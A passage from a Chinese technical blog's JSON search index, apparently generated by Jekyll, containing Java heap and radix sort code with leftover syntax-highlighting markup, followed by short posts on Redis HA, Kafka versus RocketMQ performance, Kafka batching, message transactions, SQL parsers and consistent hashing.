class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;adjustHeap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } // 建堆 private void buildMaxHeap(int[] a) { for (int i = a.length/2; i &gt;= 0; i--) { adjustHeap(a, a.length, i); } } // 调整堆 private void adjustHeap(int[] a, int size, int parent) { int left = 2 parent + 1; int right = 2 parent + 2; int largest = parent; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;adjustHeap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;largest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 8.基数排序[稳定] 原理：分配加收集 复杂度： O(d(n+r)) r为基数d为位数 空间复杂度O(n+r) // 基数排序  tpublic void radixSort(int[] a, int begin, int end, int digit) {  t t// 基数  t tfinal int radix = 10;  t t// 桶中的数据统计  t tint[] count = new int[radix];  t tint[] bucket = new int[end-begin+1];  t&lt;span class=&quot;c1&quot;&gt;// 按照从低位到高位的顺序执行排序过程&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;c1&quot;&gt;// 清空桶中的数据统计&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;radix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t t  t t&lt;span class=&quot;c1&quot;&gt;// 统计各个桶将要装入的数据个数&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getDigit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]++;&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t t  t t&lt;span class=&quot;c1&quot;&gt;// count[i]表示第i个桶的右边界索引&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;radix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t t  t t&lt;span class=&quot;c1&quot;&gt;// 将数据依次装入桶中&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 这里要从右向左扫描，保证排序稳定性 &lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getDigit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;bucket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]--;&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t t  t t&lt;span class=&quot;c1&quot;&gt;// 取出，此时已是对应当前位数有序的表&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bucket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bucket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取x的第d位的数字，其中最低位d=1&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDigit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } ",
      "url"      : "http://localhost:4000/2017/04/09/java-sort/"
    } ,
  
    {
      "title"    : "redis 跨机房HA",
      "category" : "infra",
      "content": " 基于Hystrix和双写的跨机房HA ",
      "url"      : "http://localhost:4000/2017/04/17/infra-redis-HA/"
    } ,
  
    {
      "title"    : "Kafka/RocketMQ",
      "category" : "middleware",
      "content": " 引用：Kafka vs RocketMQ——Topic数量对单机性能的影响 测试目的 对比发送端、接收端共存情况下，Topic数量对Kafka、RocketMQ的性能影响，分区数采用8个分区。这次压测我们只关注服务端的性能指标，所以压测的退出标准是: 不断增加发送端的压力,直到系统吞吐量不再上升,而响应时间拉长。此时服务端出现性能瓶颈，获取相应的系统最佳吞吐量，整个过程中保证消息没有累积。 测试结论 Kafka在Topic数量由64增长到256时，吞吐量下降了 98.37% 。 RocketMQ在Topic数量由64增长到256时，吞吐量只下降了 16% 。 为什么两个产品的表现如此悬殊呢？这是因为Kafka的每个Topic、每个分区都会对应一个物理文件。当Topic数量增加时，消息分散的落盘策略会导致磁盘IO竞争激烈成为瓶颈。而RocketMQ所有的消息是保存在同一个物理文件中的，Topic和分区数对RocketMQ也只是逻辑概念上的划分，所以Topic数的增加对RocketMQ的性能不会造成太大的影响。 在消息发送端，消费端共存的场景下，随着Topic数的增加Kafka吞吐量会急剧下降，而RocketMQ则表现稳定。因此Kafka适合Topic和消费端都比较少的业务场景，而RocketMQ更适合多Topic，多消费端的业务场景。 ",
      "url"      : "http://localhost:4000/2017/04/22/MQ/"
    } ,
  
    {
      "title"    : "Kafka吞吐量高的原因",
      "category" : "kafka",
      "content": "摘自：阿里云测试 Kafka，这款为大数据而生的消息中间件，以其百万级TPS的吞吐量名声大噪，迅速成为大数据领域的宠儿，在数据采集、传输、存储的过程中发挥着举足轻重的作用，被LinkedIn，Uber, Twitter, Netflix等大公司所采纳，而storm，spark，flink等大数据流处理或批处理平台都有Kafka的相关插件支持。 那么，Kafka的百万级TPS是如何做到的呢？有很多相关的分析，比如异步IO，PageCache，异步刷盘，消费过程零拷贝，Batch等，这些都对，但是没有一个直观的说明，这众多因素中，哪一个才是杀手锏呢？ 测试机器 一台物理机部署Kafka，另一台物理机施加压力，每个producer异步发送，异步统计结果；本文所涉及的机器配置都是24核48G内存SSD盘 当单个消息体为50字节时（with batch），kafka单机的吞吐量确实表现出色，能达到百万级。可是当单个消息体为5k字节时，TPS极速下降，只有大约3万多，少了两个数量级。对此，可能有人会说那是因为网卡打满了，还有就是因为消息体变大，每次能batch的数量变少了，导致整体TPS下降。都有可能，笔者测试时网卡虽然没有打满，却确实是负载比较高了。 50字节时，Kafka no batch（batch size设为1）时的吞吐量只有15万多，只有启用batch时的十分之一。 结论 Kafka达到百万级TPS的杀手锏就是batch！ batch, 简单说就是把多个消息打包一次性发过去，对于在线交易系统来说，这通常不是一个好的选择，会导致消息大量丢失或者大量重复，延迟也会加大。但对于大数据领域来说，由于大部分都是离线半离线的计算，对数据可靠性要求没有那么高，但追求高吞吐量。Kafka为适应大数据，选择了batch，因此，赢得了大数据的欢迎。 ",
      "url"      : "http://localhost:4000/2017/04/23/kafka-high-throughtput/"
    } ,
  
    {
      "title"    : "Message Transaction",
      "category" : "middleware",
      "content": "MQ 消息事务 消息事务放在业务库 消息事务放在MQ消息库 其他分布式事务 XA／TCC柔性事务／业务补偿，人工干预，参考 ",
      "url"      : "http://localhost:4000/2017/06/18/TRX-MSG/"
    } ,
  
    {
      "title"    : "SQL Parser",
      "category" : "middleware",
      "content": "分库分表框架设计过程中，不可避免要考虑到SQL Parser功能的实现。原因有： 需要取出sharding key来路由到正确的数据库节点（数据源） 分库分表后SQL需要进行改写，比如逻辑表到物理表 原SQL中语句功能在分库分表环境下需要重新实现，比如排序，分页，取平均值，distinct，join等 现有的SQL Parser开源方案有 JSQLParser jsqlparser 用的是 JavaCC 的方式解析 SQL，相对于 Druid 来说，性能比较低。 Druid Druid 采用的词法和语法分析的方式解析 SQL(Lexer -&gt; Parser -&gt; AST -&gt; Vistor)，编码工作量大，但性能会提升很多。Druid 的 SQL 解析器对于开发者而言稍微有些不易上手。当当sharding-jdbc，tddl部分版本采用Druid作为SQL Parser ANTLR TDDL部分版本采用了ANTLR作为SQL Parser 忘了正则表达式吧，性能是个问题 ",
      "url"      : "http://localhost:4000/2017/07/03/sql-parser/"
    } ,
  
    {
      "title"    : "consistent hash 实现",
      "category" : "algo",
      "content": "摘自:https://github.com/it-interview/easy-job/blob/master/java/%E4%B8%80%E8%87%B4%E6%80%A7Hash%E7%AE%97%E6%B3%95.md 一致性Hash算法 1.为什么要使用一致性Hash 解决余数Hash算法在服务器集群的路由映射中诸多问题。 1、余数Hash 由于HashCode随机性比较强，所以使用余数Hash路由算法就可以保证缓存数据在整个Cache服务器集群中有比较均衡的分布。 如果不考虑服务器集群的伸缩性，那么余数Hash算法几乎可以满足绝大多数的缓存路由需求，但是当分布式缓存集群需要扩容或者某些服务器下线或宕机的时候，就难办了。 比如说服务器扩容，更改服务器列表，仍然使用余数Hash，它会导致大量缓存无法命中。（其实不仅仅是无法命中，那些大量的无法命中的数据还在原缓存中在被移除前占据着内存）。大部分的业务数据度操作请求上事实上是通过缓存获取的，只有少量读操作会访问数据库，因此数据库的负载能力是以有缓存为前提而设计的。当大部分被缓存了的数据因为服务器扩容而不能正确读取时，这些数据访问的压力就落在了数据库的身上，这将大大超过数据库的负载能力，严重的可能会导致数据库宕机。 这个问题有解决方案，解决步骤为： （1）在网站访问量低谷，通常是深夜，技术团队加班，扩容、重启服务器 （2）通过模拟请求的方式逐渐预热缓存，使缓存服务器中的数据重新分布 2、一致性Hash 一致性Hash算法通过一个叫做一致性Hash环的数据结构实现Key到缓存服务器的Hash映射。 算法的具体原理这里再次贴上： 先构造一个长度为2^32的整数环（这个环被称为一致性Hash环），根据节点名称的Hash值（其分布为[0, 2^32-1]）将服务器节点放置在这个Hash环上，然后根据需要的缓存的数据的Key值计算其Hash值（其分布也为[0, 2^32-1]），接着在Hash环上顺时针查找距离这个Key值的Hash值最近的服务器节点，完成Key到服务器的映射查找。 采用一致性Hash算法，的确也会影响到服务器集群，但是影响的只是某一段而已，相比余数Hash算法影响了远超一半的影响率，这种影响要小得多。更重要的是，集群中缓存服务器节点越多，增加节点带来的影响越小，很好理解。换句话说，随着集群规模的增大，继续命中原有缓存数据的概率会越来越大，虽然仍然有小部分数据缓存在服务器中不能被读到，但是这个比例足够小，即使访问数据库，也不会对数据库造成致命的负载压力。 这种算法解决了普通余数Hash算法伸缩性差的问题，可以保证在上线、下线缓存服务器的情况下尽量有多的请求命中原来路由到的缓存服务器。 当然，万事不可能十全十美，一致性Hash算法比普通的余数Hash算法更具有伸缩性，但是同时其算法实现也更为复杂。 数据结构的选取 一致性Hash算法最先要考虑的一个问题是：构造出一个长度为232的整数环，根据节点名称的Hash值将服务器节点放置在这个Hash环上。 那么，整数环应该使用何种数据结构，才能使得运行时的时间复杂度最低？首先说明一点，关于时间复杂度，常见的时间复杂度与时间效率的关系有如下的经验规则： O(1) &lt; O(log2N) &lt; O(n) &lt; O(N * log2N) &lt; O(N2) &lt; O(N3) &lt; 2N &lt; 3N &lt; N! 一般来说，前四个效率比较高，中间两个差强人意，后三个比较差（只要N比较大，这个算法就动不了了）。OK，继续前面的话题，应该如何选取数据结构，我认为有以下几种可行的解决方案。 1、解决方案一：排序+List 我想到的第一种思路是：算出所有待加入数据结构的节点名称的Hash值放入一个数组中，然后使用某种排序算法将其从小到大进行排序，最后将排序后的数据放入List中，采用List而不是数组是为了结点的扩展考虑。 